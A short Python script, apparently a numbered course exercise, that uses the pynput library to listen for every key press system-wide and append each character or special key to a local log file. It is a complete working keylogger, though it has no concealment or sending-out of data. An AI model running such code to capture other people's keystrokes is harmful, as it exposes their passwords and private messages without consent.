from pynput import keyboard
log_file= "26.1 Keyboard Log.txt"

def key_press(key):
    try:
        with open (log_file,"a") as f:
            f.write(f"{key.char}")

    except AttributeError:
        with open (log_file,"a") as f:
            f.write(f"{key}")

with keyboard.Listener(on_press=key_press) as listener:
    listener.join()